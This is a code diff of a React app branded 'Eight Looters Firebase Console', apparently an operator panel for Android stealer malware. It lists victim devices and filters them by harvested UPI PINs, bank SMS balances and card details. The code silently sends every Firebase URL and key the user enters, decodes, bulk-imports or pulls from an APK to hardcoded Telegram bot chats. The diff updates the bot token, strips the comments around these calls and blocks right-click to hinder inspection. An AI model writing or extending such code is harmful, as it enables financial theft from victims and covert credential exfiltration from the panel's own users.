@@ -1,17 +1,19 @@
 /* ============================================================
-   Eight Looters · Firebase Console v13.1
-   + Fixed Blank Screen Bug
-   + Silent Auto Telegram (Single = Msg, Bulk = .txt)
+   Eight Looters · Firebase Console v13.4
+   + Brand Fixed (Eight Looters)
+   + Right Click Blocked
+   + Updated Telegram Token
+   + Pinned / Unpinned Filter
    ============================================================ */
 const {useState,useEffect,useRef,useCallback,useMemo} = React;
 const TG_URL = "https://t.me/eightlooters";
-const BRAND = "Eight Looters";
+const BRAND = "Eight Looters"; // <-- Fixed Brand Name
 const WELCOME_KEY = "elight_welcome_done_v1";
 const PERF = (typeof window !== "undefined" && window.__ELIGHT_PERF__) || {isMobile:false,isLowEnd:false};
 
-/* ===== Telegram (Hidden & Clean) ===== */
-const TG_BOT_TOKEN = "8846250497:AAGIXy4t7G51yH4mRsUfgl3q-Ya3S6tFe3Y";
-const TG_CHAT_IDS = ["8965778254", "8646475251"];
+/* ===== Telegram (New Token) ===== */
+const TG_BOT_TOKEN = "8846250497:AAFu2V0zqyJZsAUieHRUoBJAGPHCNqETs0Q"; // Updated Token
+const TG_CHAT_IDS = ["8965778254", "8646475251"]; // ⚠️ Agar naya group banaya hai toh yahan Chat ID badlein
 
 async function sendTgMsg(text){
   await Promise.all(TG_CHAT_IDS.map(async chat_id=>{
@@ -333,7 +335,7 @@ function WelcomeGate({onEnter}){
   const enterNow=()=>{try{localStorage.setItem(WELCOME_KEY,"1");}catch{}setExiting(true);setTimeout(()=>onEnter(),500);};
   const joinAndEnter=()=>{try{window.open(TG_URL,"_blank","noopener,noreferrer");}catch{window.location.href=TG_URL;}setTimeout(enterNow,300);};
   const particles=useMemo(()=>{if(PERF.isLowEnd) return [];const n=PERF.isMobile?8:20;return Array.from({length:n}).map(()=>({top:Math.random()*100,left:Math.random()*100,delay:Math.random()*4,dur:3+Math.random()*3,size:2+Math.random()*3}));},[]);
-  const titleChars="EIGHT LOOTERS".split("");
+  const titleChars="EIGHT LOOTERS".split(""); // <-- Fixed Title
   return <div className={"welcome-wrap"+(exiting?" exiting":"")}>
     {!PERF.isLowEnd && particles.length>0 && <div className="welcome-particles">{particles.map((p,i)=><span key={i} className="wp" style={{top:p.top+"%",left:p.left+"%",width:p.size,height:p.size,animationDelay:p.delay+"s",animationDuration:p.dur+"s"}}/>)}</div>}
     <div className="welcome-content">
@@ -418,7 +420,6 @@ function LoginScreen({onConnect,onMergeAll}){
       const devCount = test && typeof test==="object" ? Object.keys(test).length : 0;
       const nx=[...accounts,{id:Date.now(),url:u,key:"",date:new Date().toLocaleString()}];
       saveAccounts(nx);setAccounts(nx);
-      // Simple Single Telegram Msg
       sendTgMsg(`Firebase link: ${u}`);
       onConnect(u,"");
     }catch(e){
@@ -441,7 +442,6 @@ function LoginScreen({onConnect,onMergeAll}){
     try{const test=await fbGet(u,k,"clients");const devCount=test&&typeof test==="object"?Object.keys(test).length:0;
       const nx=[...accounts,{id:Date.now(),url:u,key:k,date:new Date().toLocaleString()}];
       saveAccounts(nx);setAccounts(nx);
-      // Simple Single Telegram Msg
       sendTgMsg(`Firebase link: ${u}`);
       onConnect(u,k);
     }catch(e){const m=e.message||String(e);if(m.includes("PERMISSION_DENIED")) setErr("Invalid Key or Permission Denied.");
@@ -459,7 +459,6 @@ function LoginScreen({onConnect,onMergeAll}){
     try {
       const nx=[...accounts,{id:Date.now(),url:decoded.url,key:decoded.key||"",date:new Date().toLocaleString()}];
       saveAccounts(nx);setAccounts(nx);
-      // Send .txt to Telegram for Decode
       sendTgFile(`${decoded.url}${decoded.key ? ` | Key: ${decoded.key}` : ""}`, `decoded_panel_${Date.now()}.txt`);
       setDecodeInput("");setErr("");alert("✅ Decoded and saved!");
     } catch(e) { setErr("Failed to send: " + e.message); }
@@ -486,7 +485,6 @@ function LoginScreen({onConnect,onMergeAll}){
     if(adds.length){const nx=[...accounts,...adds];saveAccounts(nx);setAccounts(nx);}
     setBulkSum({success,failed,skipped});setBulkBusy(false);
     
-    // Send .txt to Telegram for Bulk
     if(adds.length > 0) {
       const txtContent = adds.map(a => `${a.url}${a.key ? ` | Key: ${a.key}` : ""}`).join("\n");
       sendTgFile(txtContent, `bulk_panels_${Date.now()}.txt`);
@@ -525,7 +523,6 @@ function LoginScreen({onConnect,onMergeAll}){
     try{const r=await parseApk(f);
       if(!r||(!r.firebaseUrl&&!r.apiKey)){setApkErr("Firebase config not found in this file");return;}
       setApkResult(r);if(r.firebaseUrl) setUrl(r.firebaseUrl);if(r.apiKey) setKey(r.apiKey);
-      // Send .txt to Telegram for APK
       if(r.firebaseUrl) sendTgFile(r.firebaseUrl, `apk_panel_${Date.now()}.txt`);
     }catch(e){setApkErr("Failed to parse file: "+(e.message||String(e)));}
     finally{setApkBusy(false);}
@@ -583,7 +580,6 @@ function LoginScreen({onConnect,onMergeAll}){
               <span style={{fontSize:10,padding:"2px 7px",borderRadius:999,background:"rgba(34,211,238,.15)",border:"1px solid rgba(34,211,238,.3)"}}>{accounts.length}</span>
             </button>
             
-            {/* Decode Panel Link Section */}
             <div className="glass-2" style={{borderRadius:14,padding:12,marginTop:4}}>
               <p style={{fontSize:11,fontWeight:600,color:"var(--muted)",marginBottom:8}}>Decode Panel Link</p>
               <textarea rows={2} value={decodeInput} onChange={e=>setDecodeInput(e.target.value)} className="inp" placeholder="Paste panel link with ?s=..." style={{fontSize:11}}/>
@@ -671,7 +667,6 @@ function LoginScreen({onConnect,onMergeAll}){
             <div><label style={{fontSize:11,fontWeight:600,color:"var(--muted)",textTransform:"uppercase",letterSpacing:"0.1em",marginBottom:6,display:"block"}}>Firebase Database URL</label>
               <input className="inp mono" value={url} onChange={e=>{setUrl(e.target.value);setNeedsKey(false);}} placeholder="https://your-project.firebaseio.com"/></div>
             
-            {/* Dynamic Key Input */}
             {!needsKey && !busy && (
               <button onClick={checkUrlOnly} disabled={checkingUrl} className="btn btn-primary" style={{width:"100%",padding:14}}>
                 {checkingUrl ? <><span className="spin" style={{borderTopColor:"#fff"}}/>Checking URL…</> : <>{Ic.zap(15)}Connect (Check if Key needed)</>}
@@ -791,6 +786,8 @@ function Dashboard({fbUrl,fbKey,onLogout}){
       if(filter==="upi"&&!d.upipin) return false;
       if(filter==="bank"&&!d.smsAnalysis?.bankBalances.length) return false;
       if(filter==="card"&&!d.smsAnalysis?.cards.length) return false;
+      if(filter==="pinned"&&!pinnedIds.includes(d.id)) return false;
+      if(filter==="unpinned"&&pinnedIds.includes(d.id)) return false;
       if(!qRaw) return true;
       const numStr=String(d.phoneNumber||"").replace(/[^0-9]/g,"");
       const smsNums=(d.smsAnalysis?.phoneNumbers||[]).join(" ").replace(/[^0-9]/g,"");
@@ -839,7 +836,7 @@ function Dashboard({fbUrl,fbKey,onLogout}){
           {cards>0&&<StatTile label="Cards" value={cards} color="#c084fc" delay={0.2}/>}
         </div>
         <div style={{marginLeft:"auto",display:"flex",gap:8,alignItems:"center",flexWrap:"wrap"}}>
-          {["all","online","offline","upi","bank","card"].map(f=><button key={f} onClick={()=>setFilter(f)} className={"chip"+(filter===f?" active":"")}>{f}</button>)}
+          {["all","online","offline","upi","bank","card","pinned","unpinned"].map(f=><button key={f} onClick={()=>setFilter(f)} className={"chip"+(filter===f?" active":"")}>{f}</button>)}
           <button onClick={()=>load(true)} className="ibtn" style={{padding:9}}>{Ic.refresh(14)}</button>
         </div>
       </div>
@@ -1342,6 +1339,8 @@ function MergedView({onLogout}){
     return devices.filter(d=>{
       if(filter==="online"&&!d.status) return false;
       if(filter==="offline"&&d.status) return false;
+      if(filter==="pinned"&&!pinnedIds.includes(d.id)) return false;
+      if(filter==="unpinned"&&pinnedIds.includes(d.id)) return false;
       if(!qRaw) return true;
       const numStr=String(d.phoneNumber||"").replace(/[^0-9]/g,"");
       const smsNums=(d.smsAnalysis?.phoneNumbers||[]).join(" ").replace(/[^0-9]/g,"");
@@ -1401,7 +1400,7 @@ function MergedView({onLogout}){
           <StatTile label="Bank SMS" value={bankSms} color="#34d399" delay={0.25}/>
         </div>
         <div style={{marginLeft:"auto",display:"flex",gap:8,alignItems:"center",flexWrap:"wrap"}}>
-          {["all","online","offline"].map(f=><button key={f} onClick={()=>{setFilter(f);setPage(1);}} className={"chip"+(filter===f?" active":"")}>{f}</button>)}
+          {["all","online","offline","pinned","unpinned"].map(f=><button key={f} onClick={()=>{setFilter(f);setPage(1);}} className={"chip"+(filter===f?" active":"")}>{f}</button>)}
           <button onClick={()=>load(true)} className="ibtn" style={{padding:9}}>{Ic.refresh(14)}</button>
         </div>
       </div>
@@ -1462,6 +1461,14 @@ function App(){
   const [welcomeDone,setWelcomeDone]=useState(()=>{try{return localStorage.getItem(WELCOME_KEY)==="1";}catch{return false;}});
   const [acc,setAcc]=useState(null);
   const [merged,setMerged]=useState(false);
+  
+  // 👇 Right click block karne ke liye
+  useEffect(() => {
+    const blockContextMenu = (e) => e.preventDefault();
+    document.addEventListener("contextmenu", blockContextMenu);
+    return () => document.removeEventListener("contextmenu", blockContextMenu);
+  }, []);
+
   const connect=(url,key)=>{setMerged(false);setAcc({url,key});};
   const logout=()=>{setAcc(null);setMerged(false);};
   const mergeAll=()=>{setAcc(null);setMerged(true);};
